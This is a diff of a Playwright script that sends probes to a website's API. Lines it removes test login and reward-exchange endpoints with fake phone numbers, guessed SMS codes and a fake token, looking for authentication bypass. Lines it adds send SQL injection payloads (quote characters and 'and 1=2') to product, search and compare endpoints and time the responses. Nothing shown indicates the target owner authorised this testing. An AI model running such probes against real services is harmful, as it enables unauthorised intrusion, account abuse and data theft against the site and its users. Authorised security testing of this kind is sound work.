@@ -11,33 +11,30 @@ with sync_playwright() as p:
     print('ready',flush=True)
     res=page.evaluate("""async () => {
       const out={};
-      const req=async(n,method,u,body,hdrs)=>{
-        try{
-          const h=Object.assign({'lang':'zh-CN'},hdrs||{});
-          let opt={method,headers:h};
-          if(body){h['Content-Type']='application/json';opt.body=JSON.stringify(body);}
-          const r=await fetch(u,opt);const t=await r.text();
-          out[n]=r.status+'|'+(t.length>230?t.slice(0,230):t);
-        }catch(e){out[n]='ERR '+String(e).slice(0,70);}
-      };
-      const FAKE={'api-token':'00000000000000000000000000000000'};
-      await req('A1_fuli_sms_noTok','POST','/api/v1/fuli/sms',{phone:'19900000001'});
-      await req('A2_fuli_exch_noTok','POST','/api/v1/fuli/exchange',{fuliAmount:50,phone:'19900000001',smsCode:'123456',requestId:'probe1'});
-      await req('A3_fuli_exch_fakeTok','POST','/api/v1/fuli/exchange',{fuliAmount:50,phone:'19900000001',smsCode:'123456',requestId:'probe2'},FAKE);
-      await req('B1_smsLogin_full','POST','/api/v1/auth/smsLogin',{phone:'19900000001',code:'123456'});
-      await req('B2_smsLogin_emptyCode','POST','/api/v1/auth/smsLogin',{phone:'19900000001',code:''});
-      await req('B3_smsLogin_nocode','POST','/api/v1/auth/smsLogin',{phone:'19900000001'});
-      await req('B4_smsLogin_empty','POST','/api/v1/auth/smsLogin',{});
-      await req('B5_unified_fake','POST','/api/v1/auth/unifiedLogin',{identifier:'19900000001',password:'123456'});
-      await req('B6_sendLoginSms','POST','/api/v1/auth/sendLoginSms',{phone:'19900000001'});
-      await req('C1_register','POST','/api/v1/auth/register',{phone:'19900000001',code:'123456',password:'Test123456'});
-      await req('C2_signup','POST','/api/v1/auth/signup',{phone:'19900000001'});
-      await req('D1_loginInfo_noTok','GET','/api/v1/auth/loginInfo');
-      await req('D2_loginInfo_fakeTok','GET','/api/v1/auth/loginInfo',null,FAKE);
-      await req('E1_home','GET','/api/v1/home');
-      await req('E2_userIntegral','GET','/api/v1/user/integral');
+      const get=async(n,u)=>{try{const t0=performance.now();const r=await fetch(u,{headers:{'lang':'zh-CN'}});const ms=Math.round(performance.now()-t0);const t=await r.text();out[n]=r.status+'|'+ms+'ms|'+(t.length>150?t.slice(0,150):t);}catch(e){out[n]='ERR '+String(e).slice(0,60);}};
+      const E=encodeURIComponent;
+      await get('lt_base','/api/v1/product/leadtime/9376?num=1');
+      await get('lt_sq','/api/v1/product/leadtime/9376%27?num=1');
+      await get('lt_and2','/api/v1/product/leadtime/9376%20and%201=2?num=1');
+      await get('lt_num_sq','/api/v1/product/leadtime/9376?num=1%27');
+      await get('lt_num_and','/api/v1/product/leadtime/9376?num=1%20and%201=2');
+      await get('p_base','/api/v1/product/9376');
+      await get('p_sq','/api/v1/product/9376%27');
+      await get('p_and2','/api/v1/product/9376%20and%201=2');
+      await get('sr_empty','/api/v1/search/recommend');
+      await get('sr_kw','/api/v1/search/recommend?keyword=test');
+      await get('sr_kw_sq','/api/v1/search/recommend?keyword=test%27');
+      await get('sr_q','/api/v1/search/recommend?q=test');
+      await get('cmp_empty','/api/v1/compare/show');
+      await get('cmp_ids','/api/v1/compare/show?ids=131');
+      await get('cmp_sq','/api/v1/compare/show?ids=131%27');
+      await get('cart','/api/v1/cart/list');
+      await get('q_empty','/api/v1/question');
+      await get('calc','/api/v1/calculator/rules');
+      await get('fb','/api/v1/feedback/types');
+      await get('area','/api/v1/area');
       return out;
     }""")
-    print('===== API2 =====',flush=True)
-    for k,v in res.items(): print('%-24s %s'%(k,v),flush=True)
+    print('===== SQLI =====',flush=True)
+    for k,v in res.items(): print('%-14s %s'%(k,v),flush=True)
     b.close()
